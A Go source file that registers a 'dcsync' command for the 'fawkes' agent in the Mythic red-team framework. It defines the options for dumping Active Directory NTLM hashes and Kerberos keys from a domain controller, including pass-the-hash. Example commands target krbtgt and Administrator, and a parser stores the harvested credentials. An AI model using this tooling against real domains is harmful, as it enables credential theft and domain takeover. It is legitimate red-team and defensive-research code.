package agentfunctions

import (
	"fmt"
	"path/filepath"
	"strings"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/MythicMeta/MythicContainer/mythicrpc"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name:                "dcsync",
		Description:         "DCSync — replicate AD account credentials via DRS (Directory Replication Services). Extracts NTLM hashes and Kerberos keys from a Domain Controller without touching LSASS. Requires Replicating Directory Changes rights. Supports pass-the-hash.",
		HelpString:          "dcsync -server 192.168.1.1 -username admin@domain.local -password pass -target Administrator\ndcsync -server dc01 -username DOMAIN\\admin -hash aad3b435b51404ee:8846f7eaee8fb117 -target \"Administrator,krbtgt\"\ndcsync -server dc01 -username admin -password pass -domain CORP.LOCAL -target krbtgt",
		Version:             1,
		Author:              "@galoryber",
		MitreAttackMappings: []string{"T1003.006"},
		AssociatedBrowserScript: &agentstructs.BrowserScript{
			ScriptPath: filepath.Join(".", "fawkes", "browserscripts", "dcsync_new.js"),
			Author:     "@galoryber",
		},
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{
				agentstructs.SUPPORTED_OS_WINDOWS,
				agentstructs.SUPPORTED_OS_LINUX,
				agentstructs.SUPPORTED_OS_MACOS,
			},
			CommandCanOnlyBeLoadedLater: true,
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:             "server",
				CLIName:          "server",
				ModalDisplayName: "Domain Controller",
				Description:      "Domain Controller IP or hostname",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: true, GroupName: "Default"},
				},
			},
			{
				Name:             "username",
				CLIName:          "username",
				ModalDisplayName: "Username",
				Description:      "Account with Replicating Directory Changes rights (DOMAIN\\user or user@domain)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: true, GroupName: "Default"},
				},
			},
			{
				Name:             "password",
				CLIName:          "password",
				ModalDisplayName: "Password",
				Description:      "Password for authentication (or use -hash for pass-the-hash)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "hash",
				CLIName:          "hash",
				ModalDisplayName: "NTLM Hash",
				Description:      "NT hash for pass-the-hash (hex, e.g., aad3b435b51404ee:8846f7eaee8fb117 or just the NT hash)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "domain",
				CLIName:          "domain",
				ModalDisplayName: "Domain",
				Description:      "Domain name (auto-detected from username if DOMAIN\\user or user@domain format)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "target",
				CLIName:          "target",
				ModalDisplayName: "Target Account(s)",
				Description:      "Account(s) to dump, comma-separated (e.g., Administrator,krbtgt,svc_backup)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: true, GroupName: "Default"},
				},
			},
			{
				Name:             "timeout",
				CLIName:          "timeout",
				ModalDisplayName: "Timeout (seconds)",
				Description:      "Operation timeout in seconds (default: 120)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				DefaultValue:     120,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input == "" {
				return nil
			}
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
			server, _ := taskData.Args.GetStringArg("server")
			target, _ := taskData.Args.GetStringArg("target")
			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
				TaskID:  taskData.Task.ID,
				Success: true,
				OpsecPreBlocked: false,
				OpsecPreMessage: fmt.Sprintf("OPSEC WARNING: DCSync replicates credentials from DC %s via DRS (target: %s). "+
					"Generates Directory Replication Service events (Event ID 4662). "+
					"Detectable by monitoring for non-DC replication requests. "+
					"High-value credentials will be extracted.", server, target),
				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionOPSECPost: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskOPSECPostTaskMessageResponse {
			server, _ := taskData.Args.GetStringArg("server")
			target, _ := taskData.Args.GetStringArg("target")
			return agentstructs.PTTaskOPSECPostTaskMessageResponse{
				TaskID:              taskData.Task.ID,
				Success:             true,
				OpsecPostBlocked:    false,
				OpsecPostMessage:    fmt.Sprintf("OPSEC AUDIT: DCSync replication from %s (target: %s) configured. DRS events will be generated.", server, target),
				OpsecPostBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
			response := agentstructs.PTTaskProcessResponseMessageResponse{
				TaskID:  processResponse.TaskData.Task.ID,
				Success: true,
			}
			responseText, ok := processResponse.Response.(string)
			if !ok || responseText == "" {
				return response
			}
			domain := processResponse.TaskData.Callback.Host
			var creds []mythicrpc.MythicRPCCredentialCreateCredentialData
			var currentAccount string
			for _, line := range strings.Split(responseText, "\n") {
				trimmed := strings.TrimSpace(line)
				// Extract account name: [+] username (RID: 500)
				if strings.HasPrefix(trimmed, "[+] ") && strings.Contains(trimmed, "(RID:") {
					parts := strings.SplitN(trimmed[4:], " (RID:", 2)
					if len(parts) >= 1 {
						currentAccount = strings.TrimSpace(parts[0])
					}
					continue
				}
				if currentAccount == "" {
					continue
				}
				// Hash:   username:rid:lm:nt:::
				if strings.HasPrefix(trimmed, "Hash:") {
					hashPart := strings.TrimSpace(strings.TrimPrefix(trimmed, "Hash:"))
					if hashPart != "" {
						creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
							CredentialType: "hash",
							Realm:          domain,
							Account:        currentAccount,
							Credential:     hashPart,
							Comment:        "dcsync (DRSGetNCChanges)",
						})
					}
				}
				// AES256: <hex>
				if strings.HasPrefix(trimmed, "AES256:") {
					key := strings.TrimSpace(strings.TrimPrefix(trimmed, "AES256:"))
					if key != "" && !isAllZeros(key) {
						creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
							CredentialType: "key",
							Realm:          domain,
							Account:        currentAccount,
							Credential:     key,
							Comment:        "dcsync AES-256 key",
						})
					}
				}
				// AES128: <hex>
				if strings.HasPrefix(trimmed, "AES128:") {
					key := strings.TrimSpace(strings.TrimPrefix(trimmed, "AES128:"))
					if key != "" && !isAllZeros(key) {
						creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
							CredentialType: "key",
							Realm:          domain,
							Account:        currentAccount,
							Credential:     key,
							Comment:        "dcsync AES-128 key",
						})
					}
				}
			}
			registerCredentials(processResponse.TaskData.Task.ID, creds)
			if len(creds) > 0 {
				logOperationEvent(processResponse.TaskData.Task.ID,
					fmt.Sprintf("[CREDENTIAL] dcsync extracted %d hashes from %s", len(creds), processResponse.TaskData.Callback.Host), true)
			}
			return response
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}

			server, _ := taskData.Args.GetStringArg("server")
			target, _ := taskData.Args.GetStringArg("target")

			targetCount := len(strings.Split(target, ","))
			displayMsg := fmt.Sprintf("DCSync %s (%d account(s))", server, targetCount)
			response.DisplayParams = &displayMsg

			createArtifact(taskData.Task.ID, "API Call", fmt.Sprintf("DRS replication request (DCSync) to %s for %s", server, target))

			return response
		},
	})
}
